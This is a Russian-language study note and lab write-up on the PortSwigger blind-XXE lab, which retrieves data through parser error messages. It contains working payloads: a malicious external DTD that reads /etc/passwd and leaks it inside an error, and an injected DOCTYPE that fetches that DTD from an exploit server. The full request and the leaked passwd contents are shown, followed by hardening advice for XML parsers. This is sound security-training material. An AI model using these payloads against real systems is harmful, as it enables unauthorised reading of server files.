#   4    XXE через получение сообщений об ошибках!
полуслепые XXE ^ так сказать *

----

смысл в том, чтобы попататься достать данные и как то их специально так обработать, чтобы появилась ошибка содержащая эти данные , и что к этим данным невозможно применить то или иное действие

пример:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">     // file - парам сущность
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">    // eval тоже - парам сущность
 %eval;    //вызов сущности eval
 %error;   // вызов сущности %error + поиск файла по ложному пути nonexistent/%file что приводит к ошибке, но вместо текста ошибки я увижу текст из файла %eval то есть из  /etc/passwd !
 
 &#x25;   -  XML-код для символ % процента
 использую его вместо обычного `%`, потому что нахожусь **внутри значения другой сущности**. Если бы я написал просто `%error`, парсер     попытался бы немедленно подставить значение сущности `error`, которой на момент объявления `eval` ещё не существует. Использование `&#x25;` позволяет мне "протащить" символ процента в          итоговую строку как обычный текст
```

еще раз, 
обявляю параметрическую сущность file  которая должна прочесть файл "file:///etc/passwd" 

потом 
обявляю парам сущность  eval  которая содержит еще одну параметрическую сущность error (процент шифрован в &#x25; для того чтобы не распарсится сразу!) и эта внутрення error сущность должно прочесть сущность %file но по умышленно ложному пути    /nonexistent/%file который вызовет ошибку при попытке прочесть файл /etc/passwd , и ошибка может указать нормальный путь к этому файлу.

----

лаба: 
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
# Exploiting blind XXE to retrieve data via error messages

задание
нужно стащить файл /etc/passwd
но результаты не отображаются в ответе с сервера
необходимо разместить вредоносный DTD на своем сервере

------

вот оригинальный запрос
```http
POST /product/stock HTTP/2
Host: 0ab6005c0474996d83dec9ac00f000b9.web-security-academy.net
Cookie: session=GZohk53J10mIq3Ow5I38Aay8S2FyiFa7
...
..
.

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
		<productId>3</productId>
		<storeId>1</storeId>
</stockCheck>
```

---

то есть, мне нужно изменить xml в запросе так, чтобы сервер сделал запрос к моему серверу!

на моем сервере должен быть DOCTYPE который делает запрос на получение файла путем получении содержимого файла внутри ошибки пути к файлу..

-----

ссылка на мой эксплойт сервер
`https://exploit-0a7c008c046b99fc830cc8cc01c10034.exploit-server.net/exploit`


меняю запрос на этот
он добавляет параметрическую сущность  xxe
которая выполняет запрос на мой сервер!
```http
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-0a7c008c046b99fc830cc8cc01c10034.exploit-server.net/exploit">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

----
на самом своем сервер размезаю в ответе доктайп
который содержит две парм сущ , 
file пытается получить файл  ///etc/passwd
eval создает еще сущность exfil которая пытается по пути /invalid/%file прочесть сущность  file которая ведет к файлу  ///etc/passwd
что должно вызвать ошибку и внутри ошибки может оказаться содержимое файла etc/passwd 
```xml

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

```

----
реализация:

выполнив запрос
```http
POST /product/stock HTTP/2
Host: 0ab6005c0474996d83dec9ac00f000b9.web-security-academy.net
Cookie: session=GZohk53J10mIq3Ow5I38Aay8S2FyiFa7
Content-Length: 253
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ab6005c0474996d83dec9ac00f000b9.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ab6005c0474996d83dec9ac00f000b9.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-0a7c008c046b99fc830cc8cc01c10034.exploit-server.net/exploit">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

получил ответ:  
c ошибкой "XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash 
и содержимым файла


то есть содержимое файла подставилось 
тут file:///invalid/%file; вместо  ==%file==
и в ответ получил еррор о том, что путь неверный , и содержимое файла, это фантастика!

то есть весь ответ файла этого - это попытка парсера найти файл с именем как весь этот ответ ниже )
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2415

"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or directory)"



```

>  данная техника отлично работает с внешним DTD, но обычно не работает с внутренним DTD, который полностью указан в элементе`DOCTYPE`

#### такой способ можно использовать когда----------

1  Нет прямого вывода — сервер не показывает результат парсинга

2  Сервер не может отправить данные обратно на мой коллаборатор (например, не работает OOB-эксфильтрация с отправкой данных в URL)
 
3  Нужно быстро — результат приходит сразу в ответе, без возни с серверами и логами 

4  Сеть жесткая — исходящий трафик запрещен или сильно ограничен

(нет ответов от сервера вообще кроме ответов с ошибкой)


## защита от него------------------

> Если функционал не нужен критически, проще всего полностью запретить обработку DOCTYPE и внешних сущностей.

примерно так 
```
Java:
  
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
    
PHP: 

libxml_disable_entity_loader(true)
  
NET:
  settings.DtdProcessing = DtdProcessing.Prohibit
```

если полностью отключить нельзя - тогда
запретить включать один xml в другой
```java
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

// Запреn на любые внешние подключения (DTD, схемы, стили)
factory.setAttribute("http://javax.xml.XMLConstants/property/accessExternalDTD", "");
factory.setAttribute("http://javax.xml.XMLConstants/property/accessExternalSchema", "");
factory.setAttribute("http://javax.xml.XMLConstants/property/accessExternalStylesheet", "");

```

лучше всего использовать только JSON !  так как не поддерживает DTD

приложение не должно принимать DOCTYPE, можно написать валидатор, который будет ругаться на любые `<!DOCTYPE>` в запросе

использовать статические анализаторы (Semgrep, Snyk Code, Checkmarx) котор умеют находить небезопасные настройки парсеров прямо в коде, еще до того, как приложение уедет на прод


XXE живет там, где парсеру разрешено выполнять команды из непроверенного источника
поэтому при откл DTD — умирает 90% атак